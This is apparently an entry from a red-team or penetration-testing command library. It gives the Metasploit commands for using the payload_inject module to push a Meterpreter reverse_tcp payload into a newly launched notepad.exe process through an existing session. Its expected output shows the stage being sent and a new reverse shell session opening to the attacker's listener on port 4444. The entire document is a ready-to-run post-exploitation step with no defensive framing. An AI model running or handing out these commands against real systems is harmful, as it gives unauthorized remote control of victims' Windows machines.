---
id: 8fb6186d-4b5a-4e9e-a1a0-0df0e9a27c27
name: Meterpreter Migrate to x64 Process with Payload Inject
type: command
executor: metasploit
data: 'use exploit/windows/local/payload_inject

  set session 2

  run'
output: "msf5 exploit(windows/local/payload_inject) > use exploit/windows/local/payload_inject\
  \ \nmsf5 exploit(windows/local/payload_inject) > set session 2\nmsf5 exploit(windows/local/payload_inject)\
  \ > run\n\n[*] Started reverse TCP handler on 10.10.10.100:4444 \n[*] Running module\
  \ against DESKTOP-BKRO34Q\n[-] PID  does not actually exist.\n[*] Launching notepad.exe...\n\
  [*] Preparing 'windows/meterpreter/reverse_tcp' for PID 7500\n[*] Sending stage\
  \ (179779 bytes) to 10.10.10.10\n[*] Meterpreter session 3 opened (10.10.10.100:4444\
  \ -> 10.10.10.10:50223) at 2019-11-13 19:36:41 -0500"
created_at: '2019-11-14T01:00:13.488117+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Meterpreter Migrate to x64 Process with Payload Inject

```metasploit
use exploit/windows/local/payload_inject
set session 2
run
```

## Expected Output

```
msf5 exploit(windows/local/payload_inject) > use exploit/windows/local/payload_inject 
msf5 exploit(windows/local/payload_inject) > set session 2
msf5 exploit(windows/local/payload_inject) > run

[*] Started reverse TCP handler on 10.10.10.100:4444 
[*] Running module against DESKTOP-BKRO34Q
[-] PID  does not actually exist.
[*] Launching notepad.exe...
[*] Preparing 'windows/meterpreter/reverse_tcp' for PID 7500
[*] Sending stage (179779 bytes) to 10.10.10.10
[*] Meterpreter session 3 opened (10.10.10.100:4444 -> 10.10.10.10:50223) at 2019-11-13 19:36:41 -0500
```
